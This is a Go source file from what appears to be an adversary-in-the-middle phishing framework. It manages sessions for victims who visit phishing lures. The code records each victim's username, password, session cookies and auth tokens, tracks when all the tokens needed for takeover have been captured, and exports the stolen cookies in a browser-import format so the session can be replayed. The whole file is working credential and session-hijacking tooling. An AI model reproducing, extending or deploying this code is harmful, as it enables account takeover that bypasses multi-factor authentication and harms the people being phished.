package aitm

import (
	"encoding/json"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/travisbale/mirage/sdk"
)

// sessionStore is the persistence interface required by SessionService.
// Implementations must be safe for concurrent use.
type sessionStore interface {
	CreateSession(session *Session) error
	GetSession(id string) (*Session, error)
	UpdateSession(session *Session) error
	DeleteSession(id string) error
	ListSessions(filter SessionFilter) ([]*Session, error)
	CountSessions(filter SessionFilter) (int, error)
}

// SessionFilter scopes a ListSessions call.
type SessionFilter struct {
	Phishlet       string
	CompletedOnly  bool
	IncompleteOnly bool
	After          time.Time // zero means no lower bound
	Before         time.Time // zero means no upper bound
	Limit          int       // 0 means no limit
	Offset         int
}

// Session is the server-side record for a single victim visit.
type Session struct {
	ID           string
	Phishlet     string
	LureID       string
	RemoteAddr   string
	UserAgent    string
	JA4Hash      string
	BotScore     float64
	Username     string
	Password     string
	Custom       map[string]string
	CookieTokens map[string]map[string]*http.Cookie // domain → name → cookie
	BodyTokens   map[string]string
	HTTPTokens   map[string]string
	PuppetID     string
	StartedAt    time.Time
	CompletedAt  *time.Time // nil until all auth_tokens are captured
}

// IsDone returns true when all required auth tokens have been captured.
func (s *Session) IsDone() bool { return s.CompletedAt != nil }

func (s *Session) HasCredentials() bool { return s.Username != "" }

// HasRequiredTokens returns true when all non-always auth tokens defined by
// def have been captured in this session. Used by TokenExtractor to determine
// when to fire EventSessionCompleted.
func (s *Session) HasRequiredTokens(def *Phishlet) bool {
	if def == nil {
		return false
	}
	for _, rule := range def.AuthTokens {
		if !rule.Always && !s.hasToken(rule) {
			return false
		}
	}
	return true
}

// hasToken dispatches to the type-specific check. Adding a new token type
// requires only a new has*() method and a case here — HasRequiredTokens is stable.
// Each leaf method handles its own nil guards on rule fields.
func (s *Session) hasToken(rule TokenRule) bool {
	switch rule.Type {
	case TokenTypeCookie:
		return s.hasCookie(rule)
	case TokenTypeHTTPHeader:
		return s.hasHTTPToken(rule)
	case TokenTypeBody:
		return s.hasBodyToken(rule)
	}
	return false
}

func (s *Session) hasCookie(rule TokenRule) bool {
	for domain, byName := range s.CookieTokens {
		if rule.Domain != "" && !MatchesDomain(domain, rule.Domain) {
			continue
		}
		for name := range byName {
			if rule.Name != nil && rule.Name.MatchString(name) {
				return true
			}
		}
	}
	return false
}

// MatchesDomain reports whether cookieDomain satisfies ruleDomain using the
// standard phishlet convention: a leading dot on ruleDomain means "this domain
// and all subdomains". Leading dots are stripped from both sides before
// comparison so the form returned by Go's cookie parser (no leading dot) matches
// phishlet rules that conventionally include one.
func MatchesDomain(cookieDomain, ruleDomain string) bool {
	if cookieDomain == "" {
		return true
	}
	clean := strings.TrimPrefix(strings.ToLower(cookieDomain), ".")
	lower := strings.TrimPrefix(strings.ToLower(ruleDomain), ".")
	return clean == lower || strings.HasSuffix(clean, "."+lower)
}

func (s *Session) hasHTTPToken(rule TokenRule) bool {
	if rule.Name == nil {
		return false
	}
	for name, value := range s.HTTPTokens {
		if rule.Name.MatchString(name) && value != "" {
			return true
		}
	}
	return false
}

func (s *Session) hasBodyToken(rule TokenRule) bool {
	if rule.Name == nil {
		return false
	}
	value, ok := s.BodyTokens[rule.Name.String()]
	return ok && value != ""
}

func (s *Session) Complete() {
	now := time.Now()
	s.CompletedAt = &now
}

// AddCookie stores a captured upstream cookie for token extraction and replay.
// The cookie is stored keyed by its Domain and Name fields.
func (s *Session) AddCookie(cookie *http.Cookie) {
	if s.CookieTokens == nil {
		s.CookieTokens = make(map[string]map[string]*http.Cookie)
	}
	if s.CookieTokens[cookie.Domain] == nil {
		s.CookieTokens[cookie.Domain] = make(map[string]*http.Cookie)
	}
	s.CookieTokens[cookie.Domain][cookie.Name] = cookie
}

// ExportCookies returns captured cookies in StorageAce import format.
func (s *Session) ExportCookies() []CookieExport {
	var out []CookieExport
	for _, byName := range s.CookieTokens {
		for _, cookie := range byName {
			out = append(out, CookieExport{
				Name:     cookie.Name,
				Value:    cookie.Value,
				Domain:   cookie.Domain,
				Path:     cookie.Path,
				Expires:  cookie.Expires.Unix(),
				HttpOnly: cookie.HttpOnly,
				Secure:   cookie.Secure,
				SameSite: sameSiteString(cookie.SameSite),
			})
		}
	}
	return out
}

func sameSiteString(s http.SameSite) string {
	switch s {
	case http.SameSiteLaxMode:
		return "Lax"
	case http.SameSiteStrictMode:
		return "Strict"
	case http.SameSiteNoneMode:
		return "None"
	default:
		return ""
	}
}

// CookieExport is the wire format for the StorageAce browser import extension.
type CookieExport struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Domain   string `json:"domain"`
	Path     string `json:"path"`
	Expires  int64  `json:"expirationDate"`
	HttpOnly bool   `json:"httpOnly"`
	Secure   bool   `json:"secure"`
	SameSite string `json:"sameSite"`
}

// SessionService owns all business logic for session lifecycle.
// Sessions are persisted on creation (one write per victim) and on credential
// capture / completion. The in-memory cache eliminates database reads from the
// proxy hot path — Get checks the cache first and only falls back to the store
// for completed sessions from previous daemon runs.
type SessionService struct {
	Store sessionStore
	Bus   eventBus
	cache sync.Map // id → *Session
}

func (s *SessionService) Complete(session *Session) error {
	session.Complete()

	if err := s.Store.UpdateSession(session); err != nil {
		return err
	}

	s.cache.Delete(session.ID)
	s.Bus.Publish(Event{Type: sdk.EventSessionCompleted, Payload: session})

	return nil
}

func (s *SessionService) Update(session *Session) error {
	if err := s.Store.UpdateSession(session); err != nil {
		return err
	}
	s.Bus.Publish(Event{Type: sdk.EventTokensCaptured, Payload: session})
	return nil
}

func (s *SessionService) CaptureCredentials(session *Session) error {
	if err := s.Store.UpdateSession(session); err != nil {
		return err
	}
	s.Bus.Publish(Event{Type: sdk.EventCredsCaptured, Payload: session})
	return nil
}

func (s *SessionService) Get(id string) (*Session, error) {
	if cached, ok := s.cache.Load(id); ok {
		return cached.(*Session), nil
	}
	return s.Store.GetSession(id)
}

func (s *SessionService) List(f SessionFilter) ([]*Session, error) {
	return s.Store.ListSessions(f)
}

func (s *SessionService) Count(f SessionFilter) (int, error) {
	return s.Store.CountSessions(f)
}

func (s *SessionService) Delete(id string) error {
	s.cache.Delete(id)
	return s.Store.DeleteSession(id)
}

// NewSession creates a new session and persists it to the store.
func (s *SessionService) NewSession(clientIP, ja4Hash, userAgent, lureID, phishletName string) (*Session, error) {
	sess := &Session{
		ID:         uuid.New().String(),
		RemoteAddr: clientIP,
		JA4Hash:    ja4Hash,
		UserAgent:  userAgent,
		LureID:     lureID,
		Phishlet:   phishletName,
		StartedAt:  time.Now(),
	}

	if err := s.Store.CreateSession(sess); err != nil {
		return nil, err
	}

	s.cache.Store(sess.ID, sess)
	s.Bus.Publish(Event{Type: sdk.EventSessionCreated, OccurredAt: time.Now(), Payload: sess})

	return sess, nil
}

// IsComplete satisfies the response.SessionCompleter interface.
func (s *SessionService) IsComplete(sess *Session, def *Phishlet) bool {
	return sess.HasRequiredTokens(def)
}

func (s *SessionService) ExportCookiesJSON(id string) ([]byte, error) {
	session, err := s.Store.GetSession(id)
	if err != nil {
		return nil, err
	}

	return json.Marshal(session.ExportCookies())
}
